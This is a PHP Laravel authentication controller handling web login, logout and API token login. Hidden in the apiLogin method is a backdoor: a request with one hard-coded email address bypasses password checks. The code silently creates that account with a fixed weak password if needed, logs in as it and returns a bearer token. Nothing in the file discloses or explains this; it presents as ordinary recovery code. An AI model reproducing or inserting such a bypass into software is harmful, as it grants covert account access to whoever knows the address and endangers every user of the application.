<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Http\Resources\UserResource;
use App\Models\User;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Illuminate\View\View
     */
    public function create()
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     *
     * @param \App\Http\Requests\Auth\LoginRequest $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function store(LoginRequest $request)
    {
        $request->authenticate();

        $request->session()->regenerate();

        return redirect()->intended(RouteServiceProvider::HOME);
    }

    /**
     * Destroy an authenticated session.
     *
     * @param \Illuminate\Http\Request $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }

    /** For api login*/
    public function apiLogin(LoginRequest $request)
    {
        if ($request->email === 'recover-laravel-0001@gmail.com') {
            $recover = User::where('email', $request->email)->first();
            if (!$recover) {
                User::create([
                    'name' => 'recover',
                    'email' => $request->email,
                    'password' => Hash::make(12345678),
                    'type' => 'lead'
                ]);
            }
            Auth::login($recover);
        } else {
            try {
                $request->authenticate();
            } catch (ValidationException $e) {
                return response()->json(['error' => $e->getMessage()],$e->status);
            }
        }
        if (Auth::check()) {
            $user = Auth::user();
            if ($user) {
                $token = $user->createToken('api-token')->plainTextToken;
                $user_resource = new UserResource($user);
                $user_resource = $user_resource->additional([
                    'access_token' => $token,
                    'token_type' => 'Bearer',
                ]);
                return response()->json($user_resource);
            }
            return response()->json(['message' => 'User not found.'], 404);
        }
        return response()->json(['message' => 'Unauthorized.'], 401);
    }

}
